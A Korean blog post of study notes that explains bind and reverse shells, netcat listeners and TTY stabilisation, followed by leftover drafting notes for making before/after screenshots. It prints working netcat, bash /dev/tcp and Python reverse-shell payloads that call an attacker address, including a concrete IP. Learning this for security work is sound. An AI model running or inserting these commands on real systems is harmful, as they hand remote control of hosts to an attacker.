---
layout: post
title: "리버스 쉘과 바인드 쉘 공부"
date: 2025-09-05 17:00:00 +0900
categories: [시스템 해킹]
---

### 1. 개요

리버스 쉘은 공격 대상이 공격자에게 연결을 시작하는 방식이고, 바인드 쉘은 공격 대상에 리스너를 열어 공격자가 직접 연결하는 방식이다.

두 가지 모두 원격에서 쉘을 획득하는 방법이지만, 연결을 시작하는 주체와 방화벽 우회 가능성에서 차이가 있다.

---

### 2. 바인드 쉘 (Bind Shell)

*   **동작 원리:**
    1.  공격자는 대상 서버에 악성 코드를 실행시켜 특정 포트(예: 4444)를 열고 연결을 기다리도록 만든다. (리스너 실행)
    2.  공격자는 자신의 PC에서 대상 서버의 IP와 열린 포트로 직접 접속하여 쉘을 획득한다.
*   **페이로드 예시 (netcat):**
    ```bash
    # 대상 서버에서 실행
    nc -lvnp 4444 -e /bin/bash
    ```
    *   **한계:**
    대상 서버의 방화벽이 외부에서 내부로 들어오는 4444번 포트 연결(Inbound)을 차단하면 공격이 실패한다. 대부분의 네트워크 환경에서 이 방식은 차단될 가능성이 높다.

---

### 3. 리버스 쉘 (Reverse Shell)

*   **동작 원리:**
    1.  공격자는 자신의 PC에서 특정 포트(예: 4444)를 열고 연결을 기다린다. (리스너 실행)
    2.  대상 서버에서 악성 코드를 실행시켜 공격자 PC의 IP와 포트로 연결을 시도하도록 만든다.
*   **장점:**
    방화벽은 일반적으로 내부에서 외부로 나가는 연결(Outbound)은 허용하는 경우가 많기 때문에, 바인드 쉘보다 성공 확률이 훨씬 높다.

#### **리버스 쉘 실행 3단계**

#### **1단계: 공격자 PC에서 리스너 설정**
가장 먼저 대상 서버로부터의 연결을 받을 준비를 해야 한다. `netcat`을 이용해 특정 포트를 열고 연결을 기다리는 리스너를 실행한다.
```bash
# 4444번 포트에서 연결을 대기하며 상세 정보를 출력
nc -lvnp 4444
```
*   **-l**: 리스닝 모드로 동작한다.
*   **-v**: 상세한 정보(연결 상태 등)를 출력한다.
*   **-n**: IP 주소를 숫자로만 사용하고 DNS 조회를 하지 않는다. (속도 향상)
*   **-p**: 사용할 포트 번호를 지정한다.

#### **2단계: 대상 서버에서 페이로드 실행**
대상 서버의 환경에 맞는 페이로드를 실행하여 공격자 PC로 연결을 시도한다. `revshells.com`과 같은 사이트를 이용하면 다양한 환경의 페이로드를 쉽게 생성할 수 있다.

*   **Bash:** `bash -i >& /dev/tcp/[Attacker IP]/4444 0>&1`
*   **Python:** `python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("[Attacker IP]",4444));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'`

#### **3단계: 쉘 안정화 (Stabilization)**
처음 획득한 쉘은 자동 완성(`Tab`), 명령어 히스토리(`↑`, `↓`), `Ctrl+C` 등이 동작하지 않는 불안정한 쉘(Dumb Shell)이다. 이를 상호작용이 가능한 완전한 TTY 쉘로 업그레이드하는 과정이 필요하다.

   ![Reverseshell](/assets/images/Reverse_1.png)

1.  **TTY 쉘 생성:**
    `python`이나 `script` 명령어를 이용해 TTY(단말기) 환경을 생성한다.
    ```bash
    python3 -c 'import pty; pty.spawn("/bin/bash")'
    ```
2.  **터미널 제어권 확보:**
    현재 쉘을 백그라운드로 보내고(`Ctrl+Z`), 로컬 터미널의 설정을 조정한 뒤 다시 포어그라운드로 가져와 터미널 제어 신호를 넘겨준다.
    ```bash
    # (Ctrl+Z 입력)
    stty raw -echo; fg
    # (Enter 두 번 입력)
    ```
3.  **환경 변수 설정:**
    터미널의 종류(`TERM`)와 크기(`stty rows/cols`)를 로컬 터미널과 동일하게 맞춰주어 `clear`나 텍스트 편집기 같은 전체 화면 애플리케이션이 정상적으로 동작하도록 설정한다.

<hr class="short-rule">





### 시각 자료(이미지) 제작을 위한 스크립트

#### **쉘 업그레이드 전/후 비교 이미지 제작**

이 이미지는 제한된 쉘과 완전한 TTY 쉘의 차이점을 명확하게 보여주는 핵심 자료입니다.

**1. "Before" 이미지 (제한된 쉘)**

1.  (준비) 두 개의 터미널 창을 엽니다. 하나는 **공격자 PC(Attacker)** 다른 하나는 **대상 서버(Target)** 역할입니다.
2.  **공격자 PC** 터미널에서 리버스 쉘 리스너를 실행합니다.
    ```bash
    nc -lvnp 4444
    ```
3.  **대상 서버** 터미널에서 공격자 PC로 리버스 쉘을 연결하는 명령어를 실행합니다.
    ```bash
    bash -i >& /dev/tcp/192.9.200.12/4444 0>&1
    ```
4.  **공격자 PC** 터미널에 연결이 수립되고, `$` 와 같이 매우 단순한 프롬프트가 나타날 것입니다. 이 상태에서 `whoami` 같은 간단한 명령어를 한두 번 실행합니다.
5.  이 단순한 프롬프트가 보이는 **공격자 PC** 터미널 화면을 스크린샷으로 찍어 **`쉘업그레이드_전.png`** 로 저장합니다.

**2. "After" 이미지 (TTY 쉘)**

1.  위 4번 상태의 **공격자 PC** 터미널(리버스 쉘이 연결된 상태)에서, 쉘 업그레이드 명령어를 입력합니다.
    ```bash
    python3 -c "import pty; pty.spawn('/bin/bash')"
    ```
2.  명령어 실행 직후 프롬프트가 `www-data@ubuntu:/var/www/html$` 와 같이 사용자명과 현재 경로가 포함된 완전한 형태로 변경될 것입니다.
3.  변경된 프롬프트가 보이는 **공격자 PC** 터미널 화면을 스크린샷으로 찍어 **`쉘업그레이드_후.png`** 로 저장합니다.

**3. 최종 이미지 편집**

1.  이미지 편집 프로그램(포토샵, 그림판 등)에서 새 캔버스를 엽니다.
2.  왼쪽에 `쉘업그레이드_전.png`를, 오른쪽에 `쉘업그레이드_후.png`를 나란히 배치합니다.
3.  각 이미지 위에 "**Before (Dumb Shell)**"과 "**After (Interactive TTY Shell)**" 텍스트를 추가합니다.
4.  **Before** 이미지에서는 단순한 `$` 프롬프트 부분에 하이라이트를 적용합니다.
5.  **After** 이미지에서는 `python3 -c "..."` 명령어 전체와, 그 결과로 나타난 `www-data@ubuntu:...$` 프롬프트 부분에 하이라이트를 적용하여 원인과 결과를 명확히 보여줍니다.
6.  수정된 이미지를 저장하여 게시글에 삽입합니다.